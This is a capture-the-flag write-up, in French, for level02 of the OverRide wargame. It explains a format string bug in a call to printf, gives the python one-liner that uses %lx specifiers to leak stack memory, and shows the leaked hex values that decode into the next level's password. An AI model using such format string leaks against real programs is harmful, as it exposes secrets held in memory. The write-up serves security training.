# OverRide - Level02

## Analyse

Le programme lit le contenu du fichier :

```text
/home/users/level03/.pass
```

et le stocke dans une variable `password`.

L'analyse du binaire montre une **vulnérabilité de format string** dans l'appel suivant :

```c
printf(&var_78);
```

Comme la chaîne passée à `printf` est contrôlée par l'utilisateur, il est possible de lire des valeurs présentes en mémoire à l'aide des spécificateurs de format.

## Pourquoi utiliser `%lx` ?

Le binaire est un **ELF 64 bits**, ce qui signifie que :

- `%x` affiche un `unsigned int` (4 octets) ;
- `%lx` affiche un `unsigned long` (8 octets).

Afin de récupérer les données de la pile par blocs de **8 octets**, on utilise donc `%lx`.

## Recherche du mot de passe

Lors de l'exécution du programme, le mot de passe est masqué par **40 étoiles** (`****************************************`).

On peut donc supposer que le mot de passe comporte **40 caractères**, soit :

- 40 octets ;
- 5 blocs de 8 octets.

On cherche donc cinq valeurs consécutives qui ressemblent à de l'ASCII.

Après plusieurs essais, les valeurs intéressantes se trouvent entre les positions **22** et **26**.

Commande utilisée :

```bash
python -c 'print "%21$lx|" + "%22$lx|" + "%23$lx|" + "%24$lx|" + "%25$lx|" + "%26$lx|" + "%27$lx|"' | ./level02
```

Résultat :

```text
0|756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d|feff00| does not have access!
```

## Conversion des blocs

Prenons le premier bloc :

```text
756e505234376848
```

Découpage en octets :

```text
75 6e 50 52 34 37 68 48
```

Conversion ASCII :

```text
u n P R 4 7 h H
```

L'architecture étant **little-endian**, les octets sont stockés en mémoire dans l'ordre inverse.

On inverse donc les octets :

```text
H h 7 4 R P n u
```

On répète la même opération pour chacun des cinq blocs afin de reconstruire le mot de passe complet.

Le résultat obtenu correspond au **flag**.